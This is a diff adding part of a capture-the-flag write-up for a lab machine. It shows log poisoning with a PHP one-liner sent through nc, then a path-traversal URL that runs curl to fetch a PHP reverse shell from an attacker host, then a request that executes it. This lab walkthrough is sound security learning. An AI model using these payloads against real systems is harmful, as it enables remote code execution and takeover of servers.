@@ -115,6 +115,41 @@ echo -e "GET <?php if(isset($_GET['cmd']))  {  system($_GET['cmd']);  }?>" | nc 
 But I got this error message, and then I reboot target machine.
 ![image](https://user-images.githubusercontent.com/67756786/195541111-f95d8e1f-1e61-4993-8f85-7c2c0fa74aa2.png)
 
+And then I think that I just want to print result of excution, after that I change my RCE code.
+
+```
+ echo -e "<?php system(\$_GET[B]); ?>" | nc 10.10.142.129 80
+```
+
+Success!
+![image](https://user-images.githubusercontent.com/67756786/195745918-9ef79f1d-3981-4432-8764-c8382e9c0e56.png)
+
+Now we need to uplode php reverse shell and excute it.  
+First, uploade php revere shell, we can use python http server and use curl dowload reverse shell.
+Second, excute this reverse shell.
+php reverse shell(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  
+If you reverse shell is ready, we can open python http server
+![image](https://user-images.githubusercontent.com/67756786/195754923-4cc04d9b-d523-4f31-902c-e1e562060afb.png)
+
+After, we dowload and excute that.  
+Dowload
+```
+http://10.10.142.129/?ext=&view=dog/../../../../var/log/apache2/access.log&B=curl -o /var/www/html/s.php%20http://10.10.180.17/shell.php
+```
+Excute
+```
+http://10.10.142.129/?view=dog/../s
+```
+But, got a error message, seem to be not use this method.
+
+![image](https://user-images.githubusercontent.com/67756786/195755156-0699cb87-02fe-46af-a4b0-3a09d01d1eb2.png)
+
+One day ago, I conscious my dowload URL is error, default port of python http server is 8000.  
+Later, I do it again, same method, and work!
+
+revereshell
+![image](https://user-images.githubusercontent.com/67756786/195756571-aa5bc548-2fcc-4a9c-a1e6-e935aef44fcd.png)
+
 
 
 - [x] FLAG2
